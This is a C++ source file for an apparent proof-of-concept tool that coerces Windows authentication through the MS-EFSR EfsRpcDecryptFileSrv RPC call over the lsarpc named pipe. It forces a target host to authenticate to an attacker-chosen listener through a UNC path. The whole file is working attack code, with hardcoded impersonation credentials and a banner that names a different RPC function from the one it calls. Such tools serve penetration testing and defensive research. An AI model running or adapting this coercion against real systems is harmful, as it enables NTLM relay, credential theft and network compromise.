#include <assert.h>
#include <stdio.h>
#include <tchar.h>
#include <SDKDDKVer.h>
#include <Windows.h>
#include "ImpersonateUser.h"
#include "RpcUtils/Utils.hpp"
#include "ArgumentsParser/ArgumentsParser.h"

// Headers generated by midl
#include "idl/ms-efsrpc_h.h"

#pragma comment(lib, "rpcrt4.lib")


ArgumentsParser parseArgs(int argc, char* argv[]) {
	printf("Windows auth coerce using MS-EFSR::EfsRpcEncryptFileSrv() - by @podalirius_\n\n");

	ArgumentsParser parser = ArgumentsParser();
	parser.add_string_argument("from", "-f", "--from", "", true, "IP or hostname of the machine to coerce to authenticate.");
	parser.add_string_argument("to", "-t", "--to", "", true, "IP or hostname of the machine receiving the coerced authentication.");
	parser.add_boolean_switch_argument("verbose", "-v", "--verbose", false, false, "Verbose mode.");
	parser.parse_args(argc, argv);
	return parser;
}


handle_t RpcBindHandle(const RPC_WSTR InterfaceUUID, const RPC_WSTR InterfaceAddress, wchar_t* target, bool verbose)
{
	wchar_t NetworkAddr[MAX_PATH];

	RPC_STATUS RpcStatus;
	RPC_WSTR StringBinding;
	handle_t hBinding;

	unsigned long AuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
	unsigned long AuthnSvc = RPC_C_AUTHN_WINNT;
	unsigned long AuthzSvc = RPC_C_AUTHZ_NONE;

	ImpersonateUser obLogon;

	// Auth Identity structure
	SEC_WINNT_AUTH_IDENTITY_W AuthIdentity;
	SecureZeroMemory(&AuthIdentity, sizeof(AuthIdentity));
	//AuthIdentity.User = (unsigned short *)"poc";
	//AuthIdentity.UserLength = (unsigned long)strlen((char*)AuthIdentity.User);
	//AuthIdentity.Password = (unsigned short*)"Admin123!";
	//AuthIdentity.PasswordLength = (unsigned long)strlen((char*)AuthIdentity.Password);
	//AuthIdentity.Domain = (unsigned short*)"LAB.local";
	//AuthIdentity.DomainLength = (unsigned long)strlen((char*)AuthIdentity.Domain);
	//AuthIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

	// Impersonate the user
	if (!obLogon.Logon(L"dev", L"DEV", L"dev")) {
		printf("[!] Error: Impersonated user failed.\n");
		return (0);
	}

	swprintf(NetworkAddr, MAX_PATH, L"\\\\%s", target);
	// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcstringbindingcomposew
	RpcStatus = RpcStringBindingComposeW(InterfaceUUID, (RPC_WSTR)L"ncacn_np", (RPC_WSTR)NetworkAddr, InterfaceAddress, NULL, &StringBinding);
	// RpcStatus = RpcStringBindingComposeW(InterfaceUUID, (RPC_WSTR)L"ncacn_ip_tcp", (RPC_WSTR)"192.168.1.40", (RPC_WSTR)"49674", NULL, &StringBinding);

	if (RpcStatus != RPC_S_OK) {
		printf("[!] Error: RpcStringBindingComposeW returned %d\n", RpcStatus);
		return (0);
	}
	else {
		if (verbose) {
			printf("[>] Created RPC StringBinding: %ls\n", (wchar_t*)StringBinding);
		}
	}

	// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingfromstringbindingw
	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &hBinding);
	if (RpcStatus != RPC_S_OK) {
		printf("[!] Error: RpcBindingFromStringBindingW returned %d\n", RpcStatus);
		return (0);
	}
	else {
		if (verbose) {
			printf("[>] Successfully created binding from string.\n");
		}
	}

	// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcstringfreew
	RpcStatus = RpcStringFreeW(&StringBinding);
	if (RpcStatus != RPC_S_OK) {
		printf("[!] Error: RpcStringFreeW returned %d\n", RpcStatus);
		return (0);
	}
	else {
		if (verbose) {
			printf("[>] Successfully freed RPC StringBinding.\n");
		}
	}

	// http://msdn2.microsoft.com/en-us/library/ms682007.aspx
	// This function is removed in rpcrt4.dll >= 10.0.17134
	// src: https://learn.microsoft.com/en-us/uwp/win32-and-com/win32-extension-apis)
	if (AuthIdentity.UserLength == 0) {
		// Context with default Credentials
		printf("[>] Using current user session credentials.\n");
		RpcStatus = RpcBindingSetAuthInfo(hBinding, NULL, AuthnLevel, AuthnSvc, NULL, AuthzSvc);
	}
	else {
		// Context with supplied Credentials
		printf("[>] Using user supplied credentials.\n");
		if (verbose) {
			print_auth_identity(&AuthIdentity);
			print_auth_params(AuthnLevel, AuthnSvc, AuthzSvc);
		}
		RpcStatus = RpcBindingSetAuthInfoW(hBinding, NULL, AuthnLevel, AuthnSvc, &AuthIdentity, AuthzSvc);
	}
	if (RpcStatus != RPC_S_OK) {
		PrintWin32Error(RpcStatus);
		return (0);
	}
	else {
		if (verbose) {
			printf("[>] Authentication information successfully set.\n");
		}
	}

	return hBinding;
}



int perform_call(
	const char * fname, const char * vulnparam_name, wchar_t * vulnparam_value, bool verbose,
	// RPC parameters
	handle_t hBinding, wchar_t* FileName, unsigned long OpenFlag
) {
	HRESULT hr;
	printf("[+] Calling %s(%s=\"%ls\").\n", fname, vulnparam_name, vulnparam_value);
	__try
	{
		// Change call here according to your IDL
		hr = EfsRpcDecryptFileSrv(hBinding, FileName, OpenFlag);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		PrintWin32Error(GetExceptionCode());
		return -1;
	}
	printf("[+] %s returned 0x%08x.\n", fname, hr);
	return 0;
}


int main(int argc, char* argv[])
{
	const RPC_WSTR InterfaceUUID = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e";
	const RPC_WSTR InterfaceAddress = (RPC_WSTR)L"\\pipe\\lsarpc";
	const char* remote_procedure_name = "EfsRpcDecryptFileSrv";
	const char* vulnerable_parameter = "FileName";

	ArgumentsParser parser = parseArgs(argc, argv);
	bool verbose = std::get<bool>(parser.get_value("verbose"));
	// Get and convert parser value "from"
	std::string target = std::get<std::string>(parser.get_value("from"));
	std::wstring target_w = std::wstring(target.begin(), target.end());
	wchar_t* target_w_ptr = (wchar_t*)(target_w.c_str());
	// Get and convert parser value "to"
	std::string listener = std::get<std::string>(parser.get_value("to"));
	std::wstring listener_w = std::wstring(listener.begin(), listener.end());
	wchar_t* listener_w_ptr = (wchar_t*)(listener_w.c_str());

	std::cout << "[>] Coercing " << target << " to authenticate to " << listener << " using remote procedure " << remote_procedure_name << "(...)\n";

	handle_t hBinding = RpcBindHandle(InterfaceUUID, InterfaceAddress, target_w_ptr, verbose);
	
	if (hBinding != 0) {
		// Preparing arguments
		wchar_t FileName[MAX_PATH];
		swprintf(FileName, MAX_PATH, L"\\\\%s\\share\\poc.txt", (wchar_t*)(listener_w.c_str()));
		unsigned long OpenFlag = 0;

		// Performing the call
		int ret = perform_call(
			// Debug info
			remote_procedure_name, vulnerable_parameter, FileName, verbose,
			// RPC params
			hBinding, FileName, OpenFlag
		);


		RPC_STATUS RpcStatus;
		RpcStatus = RpcBindingFree(&hBinding);
		if (RpcStatus != RPC_S_OK) {
			printf("[!] Error: RpcBindingFree returned %d\n", RpcStatus);
			return (0);
		} else {
			if (verbose) {
				printf("[>] Successfully freed RPC binding with RpcBindingFree.\n");
			}
		}
	}
}
